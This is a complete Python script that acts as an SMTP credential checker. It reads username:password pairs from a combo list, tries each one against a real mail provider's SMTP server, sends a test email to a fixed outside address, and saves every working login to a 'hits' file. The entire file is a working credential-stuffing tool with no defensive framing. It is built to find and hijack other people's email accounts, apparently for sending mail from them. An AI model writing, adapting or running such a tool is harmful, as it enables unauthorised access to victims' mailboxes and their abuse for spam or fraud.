#! /usr/bin/python3

import smtplib, ssl
from email.message import EmailMessage

nachricht = EmailMessage()
nachricht.set_content("Text that is in the email")
seed = open("tonlinelist.txt", "r")
seed_arr = seed.read().splitlines()
seed.close()
current = 1

context = ssl.create_default_context()

with open("tonlinelist.txt", "r") as f:    
    lines = f.readlines()    
for line in lines :    
    username = line.split(":")[0]    
    password = line.split(":")[1]    
    mail_to = line      
    nachricht["To"] = "ahmed.mesauda@5edges.eu"    
    try:    
            context = ssl.create_default_context()
            with smtplib.SMTP("smtp.talktalk.net", 587) as server:
                server.ehlo()  # Can be omitted
                server.starttls(context=context)
                server.ehlo()  # Can be omitted
                server.login(username, password)
                server.sendmail(username, nachricht["To"], nachricht)  
            del nachricht["To"]  
            # Versenden der Nachricht    
            #server.send_message(nachricht)    
            # print("Email was successfully sent")    
            print("Email was successfully login")    
            validsmtp=username + ":" + password+"\n"    
            print("Valid smtp : "+validsmtp)    
            with open('hits.txt','a+') as sm :    
                sm.write(validsmtp)    
    except Exception as e:    
            print(e) 
            del nachricht["To"]     